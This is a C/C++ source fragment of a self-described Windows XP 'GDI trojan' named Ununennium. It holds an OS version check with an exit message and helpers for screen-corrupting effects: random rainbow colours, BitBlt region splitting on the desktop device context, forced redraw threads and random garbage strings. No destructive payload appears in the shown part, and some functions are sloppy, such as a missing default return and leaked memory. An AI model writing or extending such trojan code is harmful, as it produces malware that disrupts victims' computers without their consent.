
#define NOTSRCINVERT 0x999999ul
#define HATCHPAINT 0x1900ac010eul

WINBOOL CheckForWindowsXP() {
	OSVERSIONINFOA osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	GetVersionExA(&osvi);
	if (osvi.dwMajorVersion == 5) {
		return true;
	}
	return false;
}

void NotWindowsXP() {
	MessageBoxA(NULL, "Failed to execute Ununennium\r\nThis trojan only works on Windows XP.", "GDI-Trojan.Win32.Ununennium - Compatibility Error", MB_ICONWARNING|MB_OK);
	exit(0);
}

COLORREF GetRandomRainbowSpectrum() {
	int color = rand () % 7;
	if (color == 0) {
		return RGB(255, 0, 0);
	}
	if (color == 1) {
		return RGB(255, 150, 0);
	}
	if (color == 2) {
		return RGB(255, 255, 0);
	}
	if (color == 3) {
		return RGB(0, 255, 0);
	}
	if (color == 4) {
		return RGB(0, 255, 255);
	}
	if (color == 5) {
		return RGB(0, 0, 255);
	}
	if (color == 6) {
		return RGB(255, 0, 255);
	}
}

/* DWORD xr;
void sxorshift(DWORD seed) {
	xr = seed;
}

DWORD xorshift() {
	xr ^= xr << 13;
	xr ^= xr << 17;
	xr ^= xr << 5;
	return xr;
} */

VOID WINAPI SplitBlt(HDC hdc, int strength, int xSrc, int ySrc, DWORD dwSrcMode) {
	BitBlt(hdc, strength, strength, xSrc/2, ySrc/2, hdc, 0, 0, dwSrcMode);
	BitBlt(hdc, xSrc/2+1, strength, xSrc/2, ySrc/2, hdc, xSrc/2, 0, dwSrcMode);
	BitBlt(hdc, strength, ySrc/2+1, xSrc/2, ySrc/2, hdc, 0, ySrc/2, dwSrcMode);
	BitBlt(hdc, xSrc/2+1, ySrc/2+1, xSrc/2, ySrc/2, hdc, xSrc/2, ySrc/2, dwSrcMode);
}

int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);

DWORD CALLBACK redrawCounter(LPVOID lprdw) {
	Sleep(500);
	InvalidateRect(NULL, 0, 0);
	return 0;
}

LPCWSTR StringGen(int str) {
    WCHAR* string = new WCHAR[str + 1];
    for (int ex = 0; ex < str; ex++) {
        string[ex] = rand() % 236 + 20; // cycles through space and character 255 (y)
    }
    string[str] = L'\0';
    return string;
    
}
